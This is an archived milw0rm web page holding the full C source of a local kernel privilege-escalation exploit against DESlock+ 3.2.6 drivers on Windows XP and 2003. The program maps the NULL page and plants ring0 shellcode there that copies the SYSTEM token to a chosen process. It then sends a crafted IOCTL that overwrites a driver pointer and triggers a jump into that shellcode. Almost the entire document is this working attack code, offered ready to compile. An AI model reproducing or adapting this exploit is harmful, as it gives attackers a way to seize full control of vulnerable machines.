From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
Subject: DESlock+ <= 3.2.6 local kernel ring0 link list zero SYSTEM Exploit
Date: Sat, 27 Mar 2010 23:08:15 +0800
MIME-Version: 1.0
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Content-Location: http://milw0rm.com/exploits/5143
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5579

=EF=BB=BF<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>DESlock+ <=3D 3.2.6 local kernel ring0 link list zero =
SYSTEM Exploit</TITLE>
<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8">
<META content=3D"MSHTML 6.00.6000.16981" name=3DGENERATOR></HEAD>
<BODY><PRE>/* deslock-list-zero-v2.c
 *
 * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
 *
 * DESlock+ &lt;=3D 3.2.6 local kernel ring0 link list zero SYSTEM =
exploit
 * by mu-b - Fri 28 Dec 2007
 *
 * - Tested on: DLMFENC.sys 1.0.0.26, DLMFDISK.sys 1.2.0.27
 *              - Microsoft Windows 2003 SP2
 *              - Microsoft Windows XP SP2
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;windows.h&gt;
#include &lt;ddk/ntapi.h&gt;

#define DLMFENC_IOCTL     0x0FA4204C
#define DLMFENC_FLAG      0xC001D00D
#define DLKFDISK_R_IOCTL  0x80002008
#define DLKFDISK_SLOT     0x00000C5C

#define ARG_SIZE(a)       ((a)/sizeof (void *))

static unsigned char win32_fixup[] =3D
  "\x53"
  "\xeb\x0e"
  /* _fixup_copy  */
  "\x5e"
  "\xbf\x5c\x0c\x00\x00"
  "\x31\xc9"
  "\xb1\x04"
  "\xf3\xa5"
  "\xeb\x15"
  /* _fixup_blk   */
  "\xe8\xed\xff\xff\xff"
  "\x64\x0a\x00\x00"
  "\xd3\x0a\x00\x00"
  "\x2a\x0a\x00\x00"
  "\x49\x0a\x00\x00";

/* Win2k3 SP1/2 - kernel EPROCESS token switcher
 * by mu-b &lt;mu-b@digit-lab.org&gt;
 */
static unsigned char win2k3_ring0_shell[] =3D
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\xb0\x18\x02\x00\x00"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xd8\x00\x00\x00"
  "\x89\x88\xd8\x00\x00\x00"
  "\x90";

static unsigned char winxp_ring0_shell[] =3D
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\x70\x44"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xc8\x00\x00\x00"
  "\x89\x88\xc8\x00\x00\x00"
  "\x90";

static unsigned char win32_ret[] =3D
  "\x5b"
  "\x31\xff"
  "\xb8\xdc\x0b\x00\x00"
  "\xff\xe0"
  "\xcc";

struct ioctl_req {
  void *arg[ARG_SIZE(0x20)];
};

static PCHAR
fixup_ring0_shell (PVOID base, DWORD ppid, DWORD *zlen)
{
  DWORD dwVersion, dwMajorVersion, dwMinorVersion;

  dwVersion =3D GetVersion ();
  dwMajorVersion =3D (DWORD) (LOBYTE(LOWORD(dwVersion)));
  dwMinorVersion =3D (DWORD) (HIBYTE(LOWORD(dwVersion)));

  if (dwMajorVersion !=3D 5)
    {
      fprintf (stderr, "* GetVersion, unsupported version\n");
      exit (EXIT_FAILURE);
    }

  *(PDWORD) &amp;win32_fixup[5]  +=3D (DWORD) base;
  *(PDWORD) &amp;win32_fixup[22] +=3D (DWORD) base;
  *(PDWORD) &amp;win32_fixup[26] +=3D (DWORD) base;
  *(PDWORD) &amp;win32_fixup[30] +=3D (DWORD) base;
  *(PDWORD) &amp;win32_fixup[34] +=3D (DWORD) base;

  *(PDWORD) &amp;win32_ret[4] +=3D (DWORD) base;

  switch (dwMinorVersion)
    {
      case 1:
        *zlen =3D sizeof winxp_ring0_shell - 1;
        *(PDWORD) &amp;winxp_ring0_shell[55] =3D ppid;
        return (winxp_ring0_shell);

      case 2:
        *zlen =3D sizeof win2k3_ring0_shell - 1;
        *(PDWORD) &amp;win2k3_ring0_shell[58] =3D ppid;
        return (win2k3_ring0_shell);

      default:
        fprintf (stderr, "* GetVersion, unsupported version\n");
        exit (EXIT_FAILURE);
    }

  return (NULL);
}

static PVOID
get_module_base (void)
{
  PSYSTEM_MODULE_INFORMATION_ENTRY pModuleBase;
  PSYSTEM_MODULE_INFORMATION pModuleInfo;
  DWORD i, num_modules, status, rlen;
  PVOID result;

  status =3D NtQuerySystemInformation (SystemModuleInformation, NULL, 0, =
&amp;rlen);
  if (status !=3D STATUS_INFO_LENGTH_MISMATCH)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", =
status);
      exit (EXIT_FAILURE);
    }

  pModuleInfo =3D (PSYSTEM_MODULE_INFORMATION) HeapAlloc (GetProcessHeap =
(), HEAP_ZERO_MEMORY, rlen);

  status =3D NtQuerySystemInformation (SystemModuleInformation, =
pModuleInfo, rlen, &amp;rlen);
  if (status !=3D STATUS_SUCCESS)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", =
status);
      exit (EXIT_FAILURE);
    }

  num_modules =3D pModuleInfo-&gt;Count;
  pModuleBase =3D &amp;pModuleInfo-&gt;Module[0];
  result =3D NULL;

  for (i =3D 0; i &lt; num_modules; i++, pModuleBase++)
    if (strstr (pModuleBase-&gt;ImageName, "dlkfdisk.sys"))
      {
        result =3D pModuleBase-&gt;Base;
        break;
      }

  HeapFree (GetProcessHeap (), HEAP_NO_SERIALIZE, pModuleInfo);

  return (result);
}

static void
xor_mask_req (struct ioctl_req *req)
{
  DWORD i, pid;
  PCHAR ptr;

  pid =3D GetCurrentProcessId ();
  for (i =3D 0, ptr =3D (PCHAR) req; i &lt; 0x0C; i++, ptr++)
    *ptr ^=3D pid;
}

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  DWORD dResult, rlen, zpage_len, zlen, ppid;
  LPVOID zpage, zbuf, base;
  CHAR rbuf[64];
  HANDLE hFile;
  BOOL bResult;

  printf ("DESlock+ &lt;=3D 3.2.6 local kernel ring0 link list zero =
SYSTEM exploit\n"
          "by: &lt;mu-b@digit-labs.org&gt;\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (argc &lt;=3D 1)
    {
      fprintf (stderr, "Usage: %s &lt;processid to elevate&gt;\n", =
argv[0]);
      exit (EXIT_SUCCESS);
    }

  ppid =3D atoi (argv[1]);

  hFile =3D CreateFileA ("\\\\.\\DLKPFSD_Device", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile =3D=3D INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  zpage_len =3D 0x7FFF;
  zpage =3D (LPVOID) 0x00000001;
  dResult =3D NtAllocateVirtualMemory ((HANDLE) -1, &amp;zpage, 0, =
&amp;zpage_len,
                                     =
MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
  if (dResult !=3D STATUS_SUCCESS)
    {
      fprintf (stderr, "* NtAllocateVirtualMemory failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("* allocated page: 0x%08X [%d-bytes]\n",
          zpage, 0x7FFF);

  base =3D get_module_base ();
  if (base =3D=3D NULL)
    {
      fprintf (stderr, "* unable to find dlkfdisk.sys base\n");
      exit (EXIT_FAILURE);
    }
  printf ("* dlkfdisk.sys base: 0x%08X\n", base);

  memset (zpage, 0xCC, 0x7FFF);
  zbuf =3D fixup_ring0_shell (base, ppid, &amp;zlen);
  memcpy ((LPVOID) zpage, win32_fixup, sizeof (win32_fixup) - 1);
  memcpy ((LPVOID) (zpage + sizeof (win32_fixup) - 1), zbuf, zlen);
  memcpy ((LPVOID) (zpage + sizeof (win32_fixup) + zlen - 1),
          win32_ret, sizeof (win32_ret) - 1);

  memset (&amp;req, 0, sizeof req);
  req.arg[0] =3D (void *) DLMFENC_FLAG;
  req.arg[1] =3D (void *) 0x12;
  req.arg[2] =3D (void *) (base + DLKFDISK_SLOT); /* overwrite pointer =
*/

  printf ("* overwriting [@0x%08X %d-bytes].. ",
          base + DLKFDISK_SLOT, 16);
  xor_mask_req (&amp;req);
  bResult =3D DeviceIoControl (hFile, DLMFENC_IOCTL,
                             &amp;req, sizeof req, &amp;req, sizeof req, =
&amp;rlen, 0);
  if (!bResult)
    {
      fprintf (stderr, "DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  CloseHandle (hFile);

  hFile =3D CreateFileA ("\\\\.\\DLKFDisk_Control", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile =3D=3D INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  /* jump to our address :) */
  printf ("* jumping.. ");
  bResult =3D DeviceIoControl (hFile, DLKFDISK_R_IOCTL,
                             &amp;rbuf, sizeof rbuf, &amp;rbuf, sizeof =
rbuf, &amp;rlen, 0);
  if (!bResult)
    {
      fprintf (stderr, "DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n"
          "* hmmm, you didn't STOP the box?!?!\n");

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2008-02-18]</PRE></BODY></HTML>
